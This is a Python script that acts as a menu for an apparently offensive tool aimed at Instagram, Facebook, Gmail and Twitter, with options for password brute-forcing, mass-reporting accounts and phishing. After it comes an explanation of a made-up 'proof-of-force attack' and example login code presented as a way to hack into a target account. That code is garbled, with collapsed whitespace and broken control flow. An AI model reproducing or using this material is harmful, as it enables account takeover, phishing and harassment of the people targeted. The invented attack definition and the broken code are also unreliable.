import requests # For making HTTP requests
import time # For sleeping between requests (to avoid being blocked) 
 
# Set up your target URL and credentials (username/password) here 
target_url = "https://www.facebook.com/"  # Replace with your target URL (e.g., https://www.instagram.com/, https://twitter.com/) 
credentials = ("your_username", "your_password")  # Replace with your own username and password for the target account you want


from utils import *
from rich.console import Console
import platform
console = Console()

# print ascii art & loading screen
start()
# select social media
choice = c1()
#vpn on/off
vpn = c_vpn()


if vpn == 1:
	if "Linux" not in platform.system():
		vpn_error()



if choice == 1:
	choice = start_instagram()
	if choice == 1:
		username = get_username()
		wordlist = get_wordlist()
		insta_bruteforce(username, wordlist, vpn)
	if choice == 2:
		username = get_username()
		amount = get_amount()
		insta_massreport(username, vpn, amount, 1)
	if choice == 3:
		insta_phishing()
elif choice == 2:
	choice = start_instagram()
	if choice == 1:
		username = get_facebook()
		wordlist = get_wordlist()
		facebook_bruteforce(username, wordlist, vpn)
	if choice == 2:
		facebook_massreport()
	if choice == 3:
		facebook_phishing()
elif choice == 3:
	choice = start_instagram()
	if choice == 1:	
		username = get_email()
		wordlist = get_wordlist()
		gmail_bruteforce(username, wordlist, vpn)
	if choice == 2:
		gmail_massreport()
	if choice == 3:
		gmail_phishing()


elif choice == 4:
	choice = start_instagram()
	if choice == 1:	
		username = get_username()
		wordlist = get_wordlist()
		twitter_bruteforce(username, wordlist, vpn)
	if choice == 2:
		twitter_massreport()
	if choice == 3:
		twitter_phishing()
**WProof-of-force attack is a type of brute force attack that involves sending multiple requests to a server with the hope of overwhelming it and forcing it to respond. This can be used to gain unauthorized access to an account or system by repeatedly guessing passwords or usernames until the correct one is found.

Here's an example code for a proof-of-force attack on Facebook Instagram, Twitter:
```python
import requests # For making HTTP requests
import time # For sleeping between requests (to avoid being blocked)
 
# Set up your target URL and credentials (username/password) here 
target_url = "https://www.facebook.com/"  # Replace with your target URL (e.g., https://www.instagram.com/, https://twitter.com/) 
credentials = ("your_username", "your_password")  # Replace with your own username and password for the target account you want to hack into 
 
def login(credentials):  # Function to perform the login process using the given credentials  
    response = requests.post(target_url + "login", data={"email": credentials[0], "pass": credentials[1]})   # Send login request using POST method  
    if response.status_code == 200:                     # Check if successful response received (status code should be '200 OK')  					       	                     	      	           return True                     	       else:                      return False               
        
        
        
        
          
          
         
         ##################################################
          ''' BEGIN PROOF OF FORCE ATTACK '''
          while True:           try:             r = requests.get(target_url + "/logout")             print("Logged out successfully!")             break            except Exception as e:                print("Error logging out!", e)
              time.sleep(3)              continue            while True:           try:             r = requests.post(target_url + "/login", data={"email": credentials[0], "pass": credentials[1]})             print("Logged in successfully!")             break            except Exception as e:                print("Error logging in!", e)
              time.sleep(3)              continue           ###################v
